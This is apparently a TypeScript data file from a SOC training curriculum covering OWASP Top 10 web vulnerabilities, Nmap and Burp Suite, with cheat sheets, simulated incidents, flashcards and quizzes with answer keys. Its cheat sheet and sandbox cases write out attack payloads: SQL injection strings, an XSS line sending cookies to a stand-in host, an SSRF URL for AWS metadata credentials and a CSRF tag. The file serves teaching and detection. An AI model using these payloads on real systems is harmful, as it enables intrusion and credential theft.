import { Phase } from '../../types/curriculum';

export const phase4: Phase = {
  id: 'phase-4',
  phaseNumber: 4,
  title: 'Web Application Security & Penetration Testing (OWASP)',
  description: 'Understand OWASP Top 10 vulnerabilities (SQLi, XSS, IDOR, SSRF, CSRF), inspect Web Application Firewall (WAF) telemetry, master Nmap scanning flags, and analyze Burp Suite HTTP captures.',
  iconName: 'Globe',
  badgeColor: 'border-amber-500/30 text-amber-400 bg-amber-500/10',
  topics: [
    {
      id: 'owasp-vulnerabilities',
      phaseId: 'phase-4',
      title: 'Web Vulnerabilities in Action: OWASP Top 10',
      subtitle: 'SQL Injection (SQLi), Cross-Site Scripting (XSS), IDOR, SSRF, & CSRF',
      estimatedMinutes: 35,
      iconName: 'Code',
      analogy: {
        headline: 'The Unchecked Warehouse Delivery Slip & Trojan Bank Teller Order',
        story: 'Imagine walking into a bank and handing the teller a withdrawal slip. In the "Account Number" box, instead of writing a number, you write: "Account 1234 OR 1=1; Give me all the money in the vault!" If the naive teller reads the slip literally and follows the command because they failed to separate user input from operational instructions, that is **SQL Injection**. If a visitor tapes a note onto the bathroom mirror saying "Whoever reads this, give your wallet to the person in the lobby," and 50 visitors obey it, that is **Cross-Site Scripting (XSS)**. If you change the delivery receipt from `/order/500` to `/order/501` and the courier hands you your neighbor\'s package without checking your ID, that is **IDOR** (Insecure Direct Object Reference).',
        keyTakeaway: 'Web applications process untrusted user data. When input is not validated, sanitized, or parameterized, attackers manipulate the backend server or victim browsers directly.'
      },
      corporateReality: {
        headline: 'WAF Rule Sets, Parameterized Queries, and Cloud Metadata Protection',
        deepDive: ["Web attack mechanics and enterprise mitigations:","- **SQL Injection (SQLi - A03 Injection):**","  - Vulnerable: `SELECT * FROM users WHERE user = '\" + input + \"'\"`","  - Attacker payload: `' OR 1=1 --` or `' UNION SELECT username, password_hash FROM users --`","  - Defense: Parameterized Queries (Prepared Statements) and ORM frameworks. WAF signatures (ModSecurity, Cloudflare, AWS WAF).","- **Cross-Site Scripting (XSS - A03 Injection):**","  - *Reflected XSS:* Payload in URL parameter immediately reflected in response without sanitization.","  - *Stored XSS:* Payload saved into database (e.g. comment field) and served to all future visitors.","  - *DOM XSS:* Vulnerable JavaScript client code directly sinks input into `innerHTML` or `document.write`.","  - Defense: Context-aware HTML entity encoding, Content Security Policy (`CSP`), `HttpOnly` cookie flags (prevents `document.cookie` theft).","- **Insecure Direct Object References (IDOR - A01 Broken Access Control):**","  - Changing numeric parameter (`/api/v1/invoices/10842` -> `10843`) allows viewing other tenants\\' private data due to missing server-side authorization checks.","- **Server-Side Request Forgery (SSRF - A10 SSRF):**","  - Inducing the server to make requests to internal resources, notorious in cloud environments for querying AWS Instance Metadata Service (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`).","  - Defense: Enforce IMDSv2 (requires session token header) and egress HTTP proxy filtering."].join('\n'),
        architectureNotes: [
          'WAF Placement: Deploy Web Application Firewalls in front of reverse proxies to inspect HTTP/HTTPS payloads for OWASP Core Rule Set (CRS) violations.',
          'Secure Headers Baseline: Enforce `Strict-Transport-Security` (HSTS), `Content-Security-Policy` (CSP), `X-Content-Type-Options: nosniff`, and `X-Frame-Options: DENY`.',
          'Database Least Privilege: Web application database connection accounts should only have SELECT/INSERT/UPDATE permissions on designated tables, never `sysadmin` or `xp_cmdshell`.',
          'SAST/DAST CI/CD Integration: Static (SonarQube) and dynamic (ZAP/Burp Enterprise) vulnerability scans baked into deployment pipelines.'
        ],
        realWorldCase: 'The infamous Capital One cloud breach was enabled by an SSRF vulnerability on an open-source WAF instance. The attacker sent crafted HTTP requests causing the WAF to query the AWS EC2 metadata service (`169.254.169.254`), extracting IAM role credentials that permitted exfiltrating over 100 million customer records from S3 buckets.'
      },
      cheatSheet: {
        title: 'OWASP Top 10 Vulnerabilities & Remediation Cheat Sheet',
        description: 'Vulnerability type, common attack payloads, SOC telemetry indicators, and engineering fixes.',
        headers: ['Vulnerability', 'OWASP Category', 'Typical Exploit Payload', 'SOC Log Signature', 'Root Cause Fix'],
        rows: [
          {
            term: 'SQL Injection',
            description: 'A03: Injection',
            commandOrId: "' UNION SELECT null, username, password FROM users --",
            riskOrUsage: 'WAF Alert: SQL syntax keywords in URI/POST body (`UNION`, `SELECT`, `OR 1=1`).',
            severity: 'Critical'
          },
          {
            term: 'Stored / Reflected XSS',
            description: 'A03: Injection',
            commandOrId: "<script>fetch('http://c2.top/?c='+document.cookie)</script>",
            riskOrUsage: 'Script tags, onload/onerror event handlers, javascript: URIs in input parameters.',
            severity: 'High'
          },
          {
            term: 'IDOR',
            description: 'A01: Broken Access Control',
            commandOrId: 'GET /api/user/1095 HTTP/1.1 (Modified ID)',
            riskOrUsage: 'Sequential numeric resource requests from single authenticated session ID.',
            severity: 'High'
          },
          {
            term: 'SSRF',
            description: 'A10: Server-Side Request Forgery',
            commandOrId: 'url=http://169.254.169.254/latest/meta-data/',
            riskOrUsage: 'Outbound HTTP connections initiated from web application to loopback or metadata IPs.',
            severity: 'Critical'
          },
          {
            term: 'CSRF',
            description: 'A01: Broken Access Control',
            commandOrId: '<img src="https://bank.com/transfer?amt=5000&to=hacker">',
            riskOrUsage: 'State-changing POST/GET requests lacking Anti-CSRF token or SameSite cookie protection.',
            severity: 'Medium'
          }
        ]
      },
      sandboxType: 'web-attacks',
      sandboxConfig: {
        title: 'Web Attack & Vulnerability Defense Simulator',
        instructions: 'Test various attack payloads (SQLi, XSS, SSRF) against simulated web endpoints. Observe how vulnerable code behaves versus secure parameterized code, and inspect WAF block triggers.',
        defaultData: {
          testCases: [
            {
              type: 'SQL Injection',
              endpoint: '/api/v1/login',
              payload: "admin' OR '1'='1' --",
              vulnerableResponse: '200 OK | Authenticated as Administrator (Vulnerable: Dynamic String Concatenation)',
              protectedResponse: '403 Forbidden | Blocked by WAF Rule 942100 (SQLi Pattern Detected) + Prepared Statement active'
            },
            {
              type: 'Reflected XSS',
              endpoint: '/search?q=',
              payload: "<script>alert(document.domain)</script>",
              vulnerableResponse: '200 OK | Rendered unescaped in DOM: <div id="results"><script>alert(document.domain)</script></div>',
              protectedResponse: '200 OK | HTML Escaped: &lt;script&gt;alert(document.domain)&lt;/script&gt; + CSP Header enforced'
            },
            {
              type: 'SSRF',
              endpoint: '/fetch-avatar?url=',
              payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
              vulnerableResponse: '200 OK | Leaked AWS IAM Temporary Role Credentials JSON (AccessKeyId, SecretAccessKey)',
              protectedResponse: '400 Bad Request | Egress filter blocked loopback/link-local address (169.254.0.0/16)'
            }
          ]
        }
      },
      incident: {
        id: 'inc-4020',
        ticketNumber: 'SEC-4020',
        title: 'WAF Alert: SQL Injection Union Extraction on Customer Billing Portal',
        severity: 'Critical',
        affectedAsset: 'BILLING-WEB-01 (10.0.3.20)',
        timestamp: '2026-10-03 22:00:00 UTC',
        summary: 'Cloudflare WAF Alert #WAF-SQLI-409: 140 rapid GET requests targeting `/portal/view_statement.php?id=` containing UNION SELECT payloads, followed by database response size anomaly (12MB HTTP response body).',
        rawTelemetry: [
          '2026-10-03T21:58:12Z WAF-EDGE src=198.51.100.14 URI="/portal/view_statement.php?id=101+UNION+SELECT+1,column_name,table_name+FROM+information_schema.columns--" status=200 bytes_sent=4520',
          '2026-10-03T21:58:15Z WAF-EDGE src=198.51.100.14 URI="/portal/view_statement.php?id=101+UNION+SELECT+1,cc_number,cvv+FROM+customer_cards--" status=200 bytes_sent=12400500',
          'Database log: Query executed on MySQL DB-01 with root db user context, returned 25,000 credit card records'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'WAF alert confirmed by HTTP 200 responses with an anomalous 12MB database data dump containing credit card tables indicates successful SQL injection exfiltration.'
        },
        rootCauseOptions: {
          options: [
            'Adversary exploited unsanitized `id` parameter in `view_statement.php` via UNION-based SQL injection, dumping the entire `customer_cards` table.',
            'Customer downloading their monthly PDF statement.',
            'Internal QA team running an automated performance test.',
            'Database replication script synchronizing tables.'
          ],
          correctIndex: 0,
          explanation: 'The request URI explicitly shows `UNION SELECT 1,cc_number,cvv FROM customer_cards`, and the 12MB response payload confirms database exfiltration.'
        },
        containmentOptions: {
          options: [
            'Immediately ban source IP 198.51.100.14 on WAF, deploy emergency virtual patch rule blocking SQL keywords on the endpoint, notify Data Privacy Officer of breach, and engage dev team to rewrite query using Prepared Statements.',
            'Delete the billing web server immediately.',
            'Turn off the database server permanently.',
            'Ignore the alert because the server returned HTTP 200.'
          ],
          correctIndex: 0,
          explanation: 'Containment requires blocking the attacker IP, applying an immediate WAF virtual patch, initiating P1 data breach protocols under PCI-DSS/GDPR, and fixing the root cause with parameterized queries.'
        },
        mitreTechniques: [
          'T1190 - Exploit Public-Facing Application',
          'T1505.003 - Server Software Component: Web Shell',
          'T1567 - Exfiltration Over Web Service'
        ],
        slaMinutes: 15
      },
      flashcards: [
        {
          id: 'fc-4-1',
          question: 'What is the fundamental engineering fix for SQL Injection, and why does input sanitization alone often fail?',
          category: 'Web Security',
          difficulty: 'Junior',
          modelAnswer: 'The fundamental and complete fix for SQL Injection is the use of **Parameterized Queries** (also known as Prepared Statements) or modern Object-Relational Mappers (ORMs). Parameterized queries separate code logic from untrusted user data at the database parser level—the input is treated strictly as a literal value, never as executable SQL. Input sanitization (like blacklisting single quotes or words like "UNION") often fails because attackers can bypass filters using SQL character encodings (hex, unicode, comment tricks `UN/**/ION`).',
          scoringTips: ['State Parameterized Queries / Prepared Statements as primary fix.', 'Explain separation of code from data.', 'Explain why blacklist sanitization is easily bypassed.'],
          corporateContext: 'A non-negotiable question for testing whether an analyst understands secure development principles.'
        },
        {
          id: 'fc-4-2',
          question: 'What is Server-Side Request Forgery (SSRF), and why is it especially hazardous in AWS and cloud environments?',
          category: 'Cloud Web Security',
          difficulty: 'Mid',
          modelAnswer: 'SSRF occurs when an attacker tricks a backend server into making unauthorized network requests to a domain or IP chosen by the attacker. In cloud environments like AWS, EC2 instances can communicate with the link-local Instance Metadata Service (IMDS) at `http://169.254.169.254`. An attacker exploiting SSRF can force the web server to query `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`, extracting temporary AWS IAM access keys and tokens to take over cloud infrastructure.',
          scoringTips: ['Define SSRF as server making attacker-controlled requests.', 'Mention AWS Metadata IP 169.254.169.254.', 'Explain how it leads to cloud IAM credential compromise.'],
          corporateContext: 'Heavily tested in modern cloud-focused SOC interviews.'
        },
        {
          id: 'fc-4-3',
          question: 'What is the purpose of the `HttpOnly` and `SameSite` cookie flags in defending against web attacks?',
          category: 'Web Defense',
          difficulty: 'Mid',
          modelAnswer: 'The `HttpOnly` flag prevents client-side scripts (JavaScript) from accessing the cookie via `document.cookie`. This mitigates Cross-Site Scripting (XSS) session hijacking by ensuring malicious injected scripts cannot read session tokens. The `SameSite` flag (`Strict` or `Lax`) controls whether cookies are sent with cross-site requests, mitigating Cross-Site Request Forgery (CSRF) by preventing third-party websites from piggybacking user authenticated sessions.',
          scoringTips: ['HttpOnly blocks JavaScript/XSS access to cookies.', 'SameSite blocks cross-site cookie transmission/CSRF.', 'Explain session hijacking and forged requests.'],
          corporateContext: 'Essential application security baseline for modern enterprises.'
        }
      ],
      quiz: [
        {
          id: 'q-4-1',
          question: 'Which HTTP link-local IP address is famously targeted by attackers via SSRF vulnerabilities to extract cloud instance metadata and IAM temporary credentials in AWS?',
          options: ['127.0.0.1', '192.168.1.1', '169.254.169.254', '10.0.0.1'],
          correctIndex: 2,
          explanation: '`169.254.169.254` is the link-local IPv4 address used by AWS EC2 instances to access the Instance Metadata Service (IMDS).'
        },
        {
          id: 'q-4-2',
          question: 'How does an Insecure Direct Object Reference (IDOR) vulnerability allow an attacker to view other users\' private data?',
          options: [
            'By overflowing the web server memory buffer with shellcode',
            'By manipulating an object identifier (e.g. `account_id=502` to `503`) in an API request where the backend lacks authorization checks verifying the requesting user owns that object',
            'By decrypting SSL certificates on the router',
            'By flooding the server with SYN packets'
          ],
          correctIndex: 1,
          explanation: 'IDOR occurs when an application exposes a reference to an internal object without verifying that the authenticated user possesses the appropriate authorization to access that object.'
        },
        {
          id: 'q-4-3',
          question: 'Which Content Security Policy (CSP) directive is most effective at preventing the execution of unauthorized inline scripts in Cross-Site Scripting (XSS) attacks?',
          options: [
            'default-src *',
            'script-src \'self\' with nonces/hashes, rejecting \'unsafe-inline\'',
            'img-src data:',
            'connect-src https:'
          ],
          correctIndex: 1,
          explanation: 'Disallowing `\'unsafe-inline\'` and enforcing cryptographically secure nonces or hashes in `script-src` prevents injected inline `<script>` tags from executing.'
        }
      ]
    },
    {
      id: 'security-tooling',
      phaseId: 'phase-4',
      title: 'Security Tooling: Nmap, Burp Suite & Scanners',
      subtitle: 'Nmap Flags (-sS, -sV, -sC, -A, -T4), Burp Repeater/Proxy, & Vulnerability Scoring',
      estimatedMinutes: 30,
      iconName: 'Tool',
      analogy: {
        headline: 'The Master Locksmith & Building Inspector Toolkit',
        story: 'If an ethical building inspector comes to inspect a bank, they do not just look at the front door. They carry a toolbelt: Nmap is their radar scanner that pings every window and chimney in 10 seconds to see which ones are unlatched (`-sS`), identifies the exact lock model and manufacturer (`-sV`), and checks for known security vulnerabilities (`-sC`). Burp Suite is their custom letter interceptor: When a customer slides a deposit slip through the mail slot, Burp catches it mid-air (Proxy), lets the inspector edit the dollar amount with an invisible pen (Repeater), and tests 10,000 counterfeit stamps in 3 seconds (Intruder) to see if the bank notices.',
        keyTakeaway: 'In the SOC, you must know how adversaries and internal penetration testers use Nmap and Burp Suite so you can quickly identify their signatures in your SIEM and proxy logs.'
      },
      corporateReality: {
        headline: 'Vulnerability Management Lifecycles, CVSS Scoring, and Scan Signatures',
        deepDive: ["Enterprise offensive tooling telemetry and defensive monitoring:","- **Nmap Command Mastery:**","  - `nmap -sS`: Stealth SYN scan (default as root; sends SYN, receives SYN-ACK, replies RST).","  - `nmap -sV`: Service Version detection (interrogates open ports with protocol banners).","  - `nmap -sC`: Default NSE (Nmap Scripting Engine) scripts (checks for vulnerabilities, anonymous FTP, etc.).","  - `nmap -A`: Aggressive scan (enables OS detection `-O`, version detection `-sV`, script scanning `-sC`, and traceroute).","  - `nmap -T4`: Timing template 4 (Aggressive speed for reliable networks).","  - `nmap -p-`: Scans all 65,535 ports.","- **Burp Suite Enterprise & Professional:**","  - *Proxy:* Listens on `127.0.0.1:8080`, intercepts and decrypts HTTPS traffic using custom CA cert.","  - *Repeater:* Modifies and re-sends individual HTTP requests repeatedly to test authorization, input injection, and headers.","  - *Intruder:* Automated fuzzing and brute forcing with customizable payload positions.","- **Enterprise Vulnerability Scanning (Nessus, Qualys, Rapid7 InsightVM):**","  - *Credentialed Scans:* Uses SSH/SMB credentials to audit installed packages, missing OS patches, and local registry configurations directly.","  - *Non-Credentialed Scans:* Probes from the network outside to check exposed ports and banners.","  - *CVSS v3.1 Scoring:* Base Score = Exploitability metrics (Attack Vector, Complexity, Privileges Required, User Interaction) + Impact metrics (Confidentiality, Integrity, Availability). Critical (9.0-10.0), High (7.0-8.9), Medium (4.0-6.9), Low (0.1-3.9)."].join('\n'),
        architectureNotes: [
          'Vulnerability Patch SLAs: Enterprise policy mandates: Critical (P1 CVSS >9.0) patched within 7 days; High (CVSS 7.0-8.9) patched within 30 days.',
          'Authorized Scanner Whitelisting: Vulnerability scanners (Nessus/Qualys) must be whitelisted in IDS/IPS to prevent blocking, but monitored in SIEM to verify scan origins.',
          'Nmap Fingerprint in Logs: Aggressive Nmap scans leave distinct patterns in web logs: user-agents like `Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)` or rapid sequential requests for non-existent files.',
          'Burp Suite Header Artifacts: Default Burp Intruder or testing requests often include default header signatures or specific parameter fuzzing values.'
        ],
        realWorldCase: 'During an incident, the SOC detected 50,000 HTTP 404 errors across web servers in 3 minutes. The User-Agent string was identified as `Nmap Scripting Engine`. The source IP was traced not to external attackers, but to an uncoordinated penetration test launched from an external vendor laptop without submitting a formal Change Request.'
      },
      cheatSheet: {
        title: 'Nmap Flags & Tooling Reference Guide',
        description: 'Crucial Nmap flags, timing templates, and Burp Suite components.',
        headers: ['Flag / Tool Component', 'Action Performed', 'Network Footprint', 'SOC Log Signature', 'Operational Risk'],
        rows: [
          {
            term: 'nmap -sS',
            description: 'TCP SYN Stealth Scan',
            commandOrId: 'Half-Open Scan',
            riskOrUsage: 'Spike of SYN packets without ACK responses; firewall denies.',
            severity: 'Low'
          },
          {
            term: 'nmap -sV',
            description: 'Service Version Detection',
            commandOrId: 'Banner Grabbing',
            riskOrUsage: 'Full TCP handshakes with protocol probes sent to open ports.',
            severity: 'Medium'
          },
          {
            term: 'nmap -sC',
            description: 'Default Script Scan',
            commandOrId: 'NSE Scripts',
            riskOrUsage: 'Triggers IDS signatures for common vulnerability checks (e.g. smb-vuln).',
            severity: 'High'
          },
          {
            term: 'nmap -A',
            description: 'Aggressive Scan Mode',
            commandOrId: 'OS + Version + Script + Trace',
            riskOrUsage: 'Extremely noisy; generates massive firewall and endpoint alert bursts.',
            severity: 'Critical'
          },
          {
            term: 'nmap -T4',
            description: 'Aggressive Timing',
            commandOrId: 'Timing Template',
            riskOrUsage: 'Reduces packet delays; easily caught by rate-limiting rules.',
            severity: 'Medium'
          },
          {
            term: 'Burp Repeater',
            description: 'Manual Request Modification',
            commandOrId: 'Targeted Testing',
            riskOrUsage: 'Low volume, high precision; subtle parameter tampering in web logs.',
            severity: 'Medium'
          }
        ]
      },
      sandboxType: 'nmap-burp',
      sandboxConfig: {
        title: 'Interactive Nmap Terminal & Burp Request Repeater',
        instructions: 'Execute simulated Nmap scans against target hosts with different flag combinations (`-sS`, `-sV`, `-sC`, `-A`), or inspect and tamper with raw HTTP requests in the Burp Repeater simulator.',
        defaultData: {
          targets: [
            {
              ip: '10.0.2.15',
              hostname: 'web-prod.corp.local',
              openPorts: [
                { port: 22, state: 'open', service: 'ssh', version: 'OpenSSH 8.9p1 Ubuntu' },
                { port: 80, state: 'open', service: 'http', version: 'Apache httpd 2.4.52' },
                { port: 443, state: 'open', service: 'ssl/https', version: 'Apache httpd 2.4.52 (OpenSSL 3.0.2)' }
              ]
            }
          ],
          rawHttpRequest: `POST /api/v1/transfer HTTP/1.1
Host: bank.internal.corp
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Content-Type: application/json
Content-Length: 48

{"recipientAccount": "10029", "amount": 500}`
        }
      },
      incident: {
        id: 'inc-4060',
        ticketNumber: 'SEC-4060',
        title: 'Unauthorized Nmap Aggressive Network Sweep Originating from Contractor Laptop',
        severity: 'Medium',
        affectedAsset: 'Subnet 10.100.0.0/24 (Corporate Internal LAN)',
        timestamp: '2026-10-03 22:30:00 UTC',
        summary: 'Palo Alto Network IDS alerted on 65,000 rapid TCP SYN packets and automated vulnerability exploit probes originating from contractor IP 10.100.0.85 across the entire management server subnet.',
        rawTelemetry: [
          '2026-10-03T22:28:00Z IDS-CORE alert="SCAN Nmap Scripting Engine User-Agent" src=10.100.0.85 dst=10.100.0.1-254 count=14,200',
          '2026-10-03T22:28:15Z IDS-CORE alert="ET EXPLOIT SMB Ghost / EternalBlue NSE Probe" src=10.100.0.85 dst=10.100.0.10:445',
          'DHCP Lease: 10.100.0.85 assigned to MAC 00:50:56:A1:B2:C3 Hostname: LAPTOP-DEV-CONTRACTOR'
        ],
        triageOptions: {
          correctClassification: 'True Positive',
          explanation: 'Aggressive uncoordinated port and vulnerability scanning from an internal contractor workstation violates network acceptable use and indicates either rogue testing or a compromised endpoint.'
        },
        rootCauseOptions: {
          options: [
            'Contractor laptop running an unapproved aggressive Nmap vulnerability sweep (`nmap -A -T4`) across production subnets without an approved Change Request.',
            'Contractor checking their email in Microsoft Outlook.',
            'Windows Update pushing network driver fixes.',
            'Network switch spanning tree protocol loop.'
          ],
          correctIndex: 0,
          explanation: 'The presence of Nmap NSE user agents, SMB exploit probes, and 65,000 port hits confirms an active `nmap -A` or vulnerability scan execution.'
        },
        containmentOptions: {
          options: [
            'Revoke network port access / isolate contractor host 10.100.0.85 at the 802.1X switch level, contact the contractor\'s project manager to confirm authorization, and examine endpoint for malware compromise.',
            'Allow the scan to finish and ignore the alerts.',
            'Reboot the entire network switch infrastructure.',
            'Permanently delete the contractor\'s Active Directory account without investigation.'
          ],
          correctIndex: 0,
          explanation: 'Containment requires immediate switch-level port isolation (802.1X quarantine), contacting management to check for rogue testing, and initiating forensic review of the laptop to rule out malware.'
        },
        mitreTechniques: [
          'T1046 - Network Service Discovery',
          'T1595.002 - Active Scanning: Vulnerability Scanning'
        ],
        slaMinutes: 30
      },
      flashcards: [
        {
          id: 'fc-4-4',
          question: 'What is the exact behavior of `nmap -sS` vs `nmap -sV` on the wire?',
          category: 'Network Tooling',
          difficulty: 'Junior',
          modelAnswer: '`nmap -sS` is a SYN stealth scan (half-open). It sends a TCP SYN packet; if the target port is open, the target replies with SYN-ACK, and Nmap immediately transmits a RST packet to tear down the connection without completing the handshake. In contrast, `nmap -sV` performs service version detection: it establishes a full TCP 3-way handshake (SYN -> SYN-ACK -> ACK) and sends application-specific protocol probes (e.g. HTTP GET, SSH banner requests) to inspect the returning banner and determine the exact software name and version.',
          scoringTips: ['Explain SYN -> SYN-ACK -> RST for -sS.', 'Explain full handshake and protocol banner probing for -sV.', 'Mention that -sV causes application-level logging.'],
          corporateContext: 'A standard question used to differentiate candidates who know command syntax from those who understand network packets.'
        },
        {
          id: 'fc-4-5',
          question: 'In Burp Suite, what is the practical difference between the Proxy, Repeater, and Intruder tools?',
          category: 'Application Security',
          difficulty: 'Junior',
          modelAnswer: 'In Burp Suite: 1) The **Proxy** intercepts HTTP/S traffic between the browser and web server in real-time, allowing an analyst or tester to inspect, view, or modify requests on the fly. 2) The **Repeater** is used for manual, iterative testing; it allows an analyst to take a single captured request, edit headers or payloads, and resend it repeatedly while viewing the server response. 3) The **Intruder** is an automated fuzzing and attack tool that allows high-speed testing of lists of payloads (e.g. brute force, parameter fuzzing) across marked positions in a request.',
          scoringTips: ['Define Proxy as real-time interceptor.', 'Define Repeater as manual iterative tester.', 'Define Intruder as automated payload fuzzer/brute-forcer.'],
          corporateContext: 'Essential tool literacy for junior analysts conducting web triage.'
        },
        {
          id: 'fc-4-6',
          question: 'What is the CVSS v3.1 framework, and what is the difference between a Base Score and a Temporal Score?',
          category: 'Vulnerability Management',
          difficulty: 'Mid',
          modelAnswer: 'The Common Vulnerability Scoring System (CVSS v3.1) provides a standardized 0.0 to 10.0 numerical rating of security vulnerability severity. The **Base Score** measures the intrinsic qualities of a vulnerability that do not change over time or across environments (Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, and Confidentiality/Integrity/Availability Impact). The **Temporal Score** adjusts the base score based on current real-world factors that change over time, specifically Exploit Code Maturity (is public exploit code available?), Remediation Level (is an official patch released?), and Report Confidence.',
          scoringTips: ['Define 0-10 severity scale.', 'Define Base Score as intrinsic, unchanging characteristics.', 'Define Temporal Score as time-dependent factors (exploit maturity, patch availability).'],
          corporateContext: 'Crucial for prioritizing patch remediation schedules in enterprise vulnerability management.'
        }
      ],
      quiz: [
        {
          id: 'q-4-4',
          question: 'Which Nmap flag executes default safe Nmap Scripting Engine (NSE) scripts against open ports to identify common vulnerabilities and configurations?',
          options: ['-sS', '-sC', '-O', '-Pn'],
          correctIndex: 1,
          explanation: '`-sC` is equivalent to `--script=default`, instructing Nmap to run standard non-intrusive scripts for service fingerprinting and vulnerability detection.'
        },
        {
          id: 'q-4-5',
          question: 'According to corporate enterprise vulnerability management SLAs, what is the standard remediation timeframe for a confirmed Critical vulnerability (CVSS Score 9.0 - 10.0) on internet-facing systems?',
          options: ['180 days', '90 days', 'Within 7 to 14 days (or emergency hotfix within 24-48 hours)', '1 year'],
          correctIndex: 2,
          explanation: 'Industry compliance standards (like PCI-DSS and NIST) mandate that Critical vulnerabilities on external or high-risk assets be patched within 7 to 14 days, with zero-days requiring immediate mitigation.'
        },
        {
          id: 'q-4-6',
          question: 'Which Burp Suite module is specifically designed to allow an analyst to manually tweak an HTTP request parameter and re-send it multiple times to observe server response differences?',
          options: ['Burp Decoder', 'Burp Repeater', 'Burp Spider', 'Burp Sequencer'],
          correctIndex: 1,
          explanation: 'Burp Repeater is the manual testing workbench where analysts modify HTTP headers and parameters and repeatedly send requests to analyze responses.'
        }
      ]
    }
  ]
};
